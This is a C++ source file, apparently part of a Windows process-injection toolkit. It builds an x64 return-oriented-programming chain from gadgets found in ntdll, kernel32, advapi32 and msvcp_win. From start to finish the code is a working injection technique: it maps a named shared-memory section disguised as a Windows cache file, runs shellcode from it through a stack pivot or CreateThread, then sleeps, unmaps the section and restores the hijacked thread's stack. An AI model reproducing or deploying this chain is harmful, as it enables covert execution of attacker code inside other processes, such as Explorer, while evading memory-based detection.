#include "buildrop.h"


PINJECTRA_PACKET* BuildROPChain(TStrDWORD64Map& runtime_parameters, uint64_t map_size, bool is_image_backed, int exec_option, int unmap_option, bool vvp_to_rx) {
	PINJECTRA_PACKET* output;
	DWORD64 rop_pos = 0;
	DWORD64* ROP_chain;
	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));

	HMODULE ntdll = GetModuleHandleA("ntdll");
	TEXT_SECTION_INFO ntdll_info = GetTextSection(ntdll);

	HMODULE kernel32 = GetModuleHandleA("kernel32");
	TEXT_SECTION_INFO kernel32_info = GetTextSection(kernel32);

	HMODULE advapi = LoadLibraryA("advapi32.dll");
	TEXT_SECTION_INFO advapi_info = GetTextSection(advapi);

	HMODULE msvcp_win = GetModuleHandleA("msvcp_win");
	TEXT_SECTION_INFO msvcp_win_info = GetTextSection(msvcp_win);

	DWORD64 LoadLibraryA_location = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	DWORD64 GADGET_ret = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\xc3", 1);
	DWORD64 GADGET_pivot = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x5C\xC3", 2); // pop rsp; ret
	DWORD64 GADGET_RAX_pivot = (DWORD64)memmem(((BYTE*)kernel32_info.address), kernel32_info.size, "\x50\xc3", 2); 	//0x000000018003afb4 : push rax; ret // 50c3
	DWORD64 GADGET_RCX_pivot = (DWORD64)memmem(((BYTE*)msvcp_win_info.address), msvcp_win_info.size, "\x51\xc3", 2); // push rcx; ret //51c3

	DWORD64 GADGET_popregs = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
	DWORD64 GADGET_popRCX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x59\xC3", 2); // pop rcx; ret;
	DWORD64 GADGET_popRDX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x5a\x41\x5b\xc3", 4); //pop rdx pop r11 ret
	DWORD64 GADGET_popR8 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x58\xc3", 3); // pop r8 ; ret;
	DWORD64 GADGET_POP_R9_R10_r11 = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x41\x59\x41\x5a\x41\x5b\xc3", 7); //0x000000018008fb34 : pop r9 ; pop r10 ; pop r11 ; ret // 4159415a415bc3
	DWORD64 GADGET_popR14 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x41\x5E\xC3", 3);

	DWORD64 GADGET_RAXtoRCX = (DWORD64)memmem((BYTE*)advapi_info.address, advapi_info.size, "\x48\x8b\xc8\x48\x8b\xc1\x48\x83\xc4\x28\xc3", 11); //0x000000018001852a : mov rcx, rax ; mov rax, rcx ; add rsp, 0x28 ; ret // 488bc8488bc14883c428c3
	DWORD64 GADGET_RAXtoRBX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x50\x5b\xc3", 3); //0x00000001800011a3 : push rax ; pop rbx ; ret // 505bc3
	DWORD64 GADGET_RAXtoR9 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4C\x8B\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11); //mov r9, rax; mov rax, r9; add rsp, 0x28; ret;
	DWORD64 GADGET_RBXtoRAX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x48\x8b\xc3\x48\x83\xc4\x20\x5b\xc3", 9); //0x00000001800695d8 : mov rax, rbx ; add rsp, 0x20 ; pop rbx ; ret // 488bc34883c4205bc3
	DWORD64 GADGET_AddR14toRAX = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4C\x01\xF0\xC3", 4);
	DWORD64 GADGET_RCXtoR8 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x4c\x8b\xc1\x48\x3b\xca\x77\xd7\x49\x8b\xc0\xc3\xcc\x33\xc0\xc3", 16); //mov r8, rcx; cmp rcx, rdx; ja 0x64bd9; mov rax, r8; ret;

	DWORD64 GADGET_addrsp = (DWORD64)memmem((BYTE*)ntdll_info.address, ntdll_info.size, "\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
	DWORD64 GADGET_addrsp_0x38 = (DWORD64)memmem(((BYTE*)ntdll_info.address), ntdll_info.size, "\x48\x83\xC4\x38\xC3", 5); //add rsp, 0x38; ret

	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));

#define DONT_CARE 0

	if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
	{
		ROP_chain[rop_pos++] = GADGET_ret;
	}

	// Load the 2 additional libraries used in gadgets - advapi32 and msvcp_win_info. They should be loaded in already but just in case (Explorer will have them loaded)
	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = 0x0; // rax
	ROP_chain[rop_pos++] = 0x0; // rdx
	DWORD64 advapi_string = rop_pos++; ; //rcx
	ROP_chain[rop_pos++] = DONT_CARE;// r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = LoadLibraryA_location;

	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = 0x0; // rax
	ROP_chain[rop_pos++] = 0x0; // rdx
	DWORD64 msvcp_win_string = rop_pos++; ; //rcx
	ROP_chain[rop_pos++] = DONT_CARE;// r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = LoadLibraryA_location;

	ROP_chain[rop_pos++] = GADGET_popregs;

	ROP_chain[rop_pos++] = 0x0; // rax
	ROP_chain[rop_pos++] = 0x1; // rdx
	if (vvp_to_rx) {
		ROP_chain[rop_pos++] = 0x0004; //rcx  //normal one
	}
	else {
		ROP_chain[rop_pos++] = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE; //rcx
	}
	DWORD64 mapname = rop_pos++; // r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "OpenFileMappingA");
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp


	// transfer RAX to RCX, adjust stack from by fourty bytes
	ROP_chain[rop_pos++] = GADGET_RAXtoRCX;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

	// RDX
	ROP_chain[rop_pos++] = GADGET_popRDX;
	if (vvp_to_rx) {
		ROP_chain[rop_pos++] = 0x0004; //rcx  //normal one
	}
	else {
		ROP_chain[rop_pos++] = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE; //rcx
	}
	ROP_chain[rop_pos++] = 0x0; // <- r11

	// R8
	ROP_chain[rop_pos++] = GADGET_popR8;
	ROP_chain[rop_pos++] = 0x0; // <- r8

	// R9
	ROP_chain[rop_pos++] = GADGET_POP_R9_R10_r11;
	ROP_chain[rop_pos++] = 0x0; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11

	// 5th arg - placed on stack b/c of FastCall x64 calling convention
	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "MapViewOfFile");
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = map_size; //  


	// if it is image backed, we need to move the pointer forward by 0x1000 to the .text RX region
	if (is_image_backed) {
		ROP_chain[rop_pos++] = GADGET_popR14;
		int virtual_address_offset = 4096; //0x1000
		ROP_chain[rop_pos++] = virtual_address_offset;
		// Now we need to add R14 to RAX
		ROP_chain[rop_pos++] = GADGET_AddR14toRAX;
	}


	while (1) {
		if (exec_option == 0) {
			ROP_chain[rop_pos++] = GADGET_RAX_pivot;
			ROP_chain[rop_pos++] = GADGET_addrsp;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			break;
		}
		//store the mapped address in RBX, which doesn't get clobbered by CreateThread, so we can unmap after
		ROP_chain[rop_pos++] = GADGET_RAXtoRBX;
		if (exec_option == 1) {
			ROP_chain[rop_pos++] = GADGET_RAXtoRCX;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			// Now we need to get RDX to be higher than RCX
			ROP_chain[rop_pos++] = GADGET_popRDX;
			ROP_chain[rop_pos++] = 0xffffffffffffffff; // pop into RDX
			ROP_chain[rop_pos++] = DONT_CARE; //pop into R11
			ROP_chain[rop_pos++] = GADGET_RCXtoR8;
			//Now the target address is properly in R8
			//// CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
			ROP_chain[rop_pos++] = GADGET_popRCX;
			ROP_chain[rop_pos++] = 0x0;
			ROP_chain[rop_pos++] = GADGET_popRDX;
			ROP_chain[rop_pos++] = 0x0; // <- rdx
			ROP_chain[rop_pos++] = 0x0; // <- r11, irrelevant
			ROP_chain[rop_pos++] = GADGET_POP_R9_R10_r11;
			ROP_chain[rop_pos++] = DONT_CARE; // r9
			ROP_chain[rop_pos++] = DONT_CARE; // r10
			ROP_chain[rop_pos++] = DONT_CARE; // r11

			//// then the function call
			ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateThread");
			ROP_chain[rop_pos++] = GADGET_addrsp_0x38; //skips 56 bytes, aka 7 spots
			//ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = 0x2710; // 5th arg
			ROP_chain[rop_pos++] = 0x0; // 6th arg
			ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = GADGET_addrsp;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			break;
		}
		if (exec_option == 2) {
			ROP_chain[rop_pos++] = GADGET_popRCX;
			ROP_chain[rop_pos++] = 0x0;

			ROP_chain[rop_pos++] = GADGET_RAXtoR9;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			ROP_chain[rop_pos++] = GADGET_popR8;
			ROP_chain[rop_pos++] = GADGET_RCX_pivot; // RCX_pivot into R8 - this is where new thread will start
			ROP_chain[rop_pos++] = GADGET_popRDX;
			ROP_chain[rop_pos++] = 0x0; // <- rdx //2mb stack?
			ROP_chain[rop_pos++] = 0x0; // <- r11, irrelevant

			//// then the function call
			ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateThread");
			ROP_chain[rop_pos++] = GADGET_addrsp_0x38; //skips 56 bytes, aka 7 spots
			//ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = 0x0; // 5th arg
			ROP_chain[rop_pos++] = 0x0; // 6th arg
			ROP_chain[rop_pos++] = DONT_CARE;
			ROP_chain[rop_pos++] = GADGET_addrsp;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		}
	}
	if (unmap_option) {
		// UNMAP VIEW of the section now
		// First we need to sleep (10 seconds = 0x2710) while the shellcode executes
		ROP_chain[rop_pos++] = GADGET_popRCX;
		ROP_chain[rop_pos++] = 0x2710;
		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "Sleep");
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space

		// Now we can recover the pointer from RBX and unmap
		ROP_chain[rop_pos++] = GADGET_RBXtoRAX;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE;
		ROP_chain[rop_pos++] = GADGET_RAXtoRCX;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

		// RDX
		ROP_chain[rop_pos++] = GADGET_popRDX;
		ROP_chain[rop_pos++] = 0x0; // <- rdx
		ROP_chain[rop_pos++] = 0x0; // <- r11

		// R8
		ROP_chain[rop_pos++] = GADGET_popR8;
		ROP_chain[rop_pos++] = 0x0; // <- r8

		// R9
		ROP_chain[rop_pos++] = GADGET_POP_R9_R10_r11;
		ROP_chain[rop_pos++] = 0x0; // r9
		ROP_chain[rop_pos++] = DONT_CARE; // r10
		ROP_chain[rop_pos++] = DONT_CARE; // r11

		// 5th arg - placed on stack b/c of FastCall x64 calling convention
		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "UnmapViewOfFile");
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE;
	}

	//////////////////// CLEANUP CODE /////////////////////
	ROP_chain[rop_pos++] = GADGET_popregs;
	ROP_chain[rop_pos++] = DONT_CARE; // rax
	DWORD64 saved_return_address = rop_pos++; // rdx
	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
	ROP_chain[rop_pos++] = 8; // r8
	ROP_chain[rop_pos++] = DONT_CARE; // r9
	ROP_chain[rop_pos++] = DONT_CARE; // r10
	ROP_chain[rop_pos++] = DONT_CARE; // r11
	ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

	ROP_chain[rop_pos++] = GADGET_pivot;
	ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];

	//copy advapi32.dll and msvcp_win.dll into the proper positions in chain
	ROP_chain[advapi_string] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	strcpy((char*)&ROP_chain[rop_pos++], "advapi32");
	strcpy((char*)&ROP_chain[rop_pos++], ".dll\0");

	ROP_chain[msvcp_win_string] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	strcpy((char*)&ROP_chain[rop_pos++], "msvcp_wi");
	strcpy((char*)&ROP_chain[rop_pos++], "n.dll\0");

	// this is the name of the memory map for the shmem
	ROP_chain[mapname] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	// \\Sessions\\1\\BaseNamedObjects\\C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8828-1A9A39C3FDA2}.2.ver0x0000000000000001.db
	strcpy((char*)&ROP_chain[rop_pos++], "Local\\C:");
	strcpy((char*)&ROP_chain[rop_pos++], "*Program");
	strcpy((char*)&ROP_chain[rop_pos++], "Data*Mic");
	strcpy((char*)&ROP_chain[rop_pos++], "rosoft*W");
	strcpy((char*)&ROP_chain[rop_pos++], "indows*C");
	strcpy((char*)&ROP_chain[rop_pos++], "aches*{D");
	strcpy((char*)&ROP_chain[rop_pos++], "DF571F2-");
	strcpy((char*)&ROP_chain[rop_pos++], "BE98-426");
	strcpy((char*)&ROP_chain[rop_pos++], "D-8828-1");
	strcpy((char*)&ROP_chain[rop_pos++], "A9A39C3F");
	strcpy((char*)&ROP_chain[rop_pos++], "DA2}.2.v");
	strcpy((char*)&ROP_chain[rop_pos++], "er0x0000");
	strcpy((char*)&ROP_chain[rop_pos++], "00000000");
	strcpy((char*)&ROP_chain[rop_pos++], "0001.db\0");


	ROP_chain[rop_pos++] = DONT_CARE;

	ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	ROP_chain[rop_pos++] = DONT_CARE;

	// Update Runtime Parameters with ROP-specific Parameters
	runtime_parameters["saved_return_address"] = saved_return_address;
	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
	runtime_parameters["rop_pos"] = rop_pos;

	output->buffer = ROP_chain;
	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
	output->metadata = &runtime_parameters;

	return output;
}

